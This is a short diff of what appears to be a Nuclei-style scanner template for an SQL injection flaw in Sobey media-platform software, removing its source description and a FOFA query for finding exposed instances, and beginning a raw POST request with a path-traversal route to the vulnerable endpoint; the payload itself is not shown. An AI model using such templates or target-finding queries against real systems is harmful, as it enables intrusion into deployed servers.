@@ -3,12 +3,8 @@ info:
   name: 索贝融媒体wxarticleList存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/obykal72stzo86o0'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: obykal72stzo86o0
-    fofa: icon_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
 http:
 - raw:
   - 'POST /sobey-mchEditor/mch/statistics/js/../wxarticleList HTTP/1.1
